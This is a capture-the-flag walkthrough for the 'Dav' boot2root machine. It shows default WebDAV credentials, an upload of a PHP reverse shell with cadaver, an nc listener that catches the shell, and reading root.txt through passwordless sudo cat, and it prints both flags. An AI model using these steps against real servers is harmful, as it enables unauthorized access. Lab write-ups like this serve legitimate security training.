# Dav

boot2root machine for FIT and bsides guatemala CTF

Read `user.txt` and `root.txt`

# #1 - user.txt

## Nmap

Nmap reveals only 1 open port, HTTP, on standard port 80.

~~~
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
~~~

## Web enumeration

There is no `robots.txt` file that may have disclosed hidden locations, but dirsearch found a `/webdav/` directory, which requires an authentication.

Searching for the terms `default credentials webdav` on Google leads to [this link](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) that applies to XAMPP, but why not giving it a try?

Guess what? It worked with `wampp:xampp`!

## Webdav

Now authenticated, we are able to list the files on the webdav server, and there is only 1 file, which was the authentication file:

~~~
$ wget --http-user="wampp" --http-password="xampp" http://10.10.19.245/webdav/passwd.dav
$ cat passwd.dav 
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
~~~

Now that we have access, let's confirm if the server allows us to put files:

~~~
$ curl -u "wampp:xampp" -X PUT http://10.10.19.245/webdav/test
~~~

The file `test` is successfully uploaded to the server.

## Reverse shell

Let's use `cadaver` to upload a [PHP reverse shell](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz):

~~~
$ cadaver http://10.10.19.245/webdav
Authentication required for webdav on server `10.10.19.245':
Username: wampp
Password: 
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 5491 bytes succeeded.
dav:/webdav/> quit
Connection to `10.10.19.245' closed.
~~~

Now, open a listener on our machine:

~~~
$ rlwrap nc -nlvp 4444
~~~

Open the URL where you have uploaded the PHP shell (e.g. http://10.10.19.245/webdav/shell.php) and voila, you have a reverse shell.

~~~
$ rlwrap nc -nlvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.19.245.
Ncat: Connection from 10.10.19.245:55292.
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 13:47:48 up  1:56,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
~~~

## User flag

Now, let's upgrade our shell and get the flag:

~~~
$ SHELL=/bin/bash script -q /dev/null
www-data@ubuntu:/$ cd /home
www-data@ubuntu:/home$ ls
merlin	wampp
www-data@ubuntu:/home/wampp$ cd /home/merlin/
www-data@ubuntu:/home/merlin$ ls -la
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
www-data@ubuntu:/home/merlin$ cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
~~~

User flag: `449b40fe93f78a938523b7e4dcd66d2a`

# #2 - root.txt

Checking our privileges with `sudo -l` reveals that we can `cat` any file with `sudo` without password. Let's get the root flag:

~~~
www-data@ubuntu:/home/merlin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
~~~

Root flag: `101101ddc16b0cdf65ba0b8a7af7afa5`
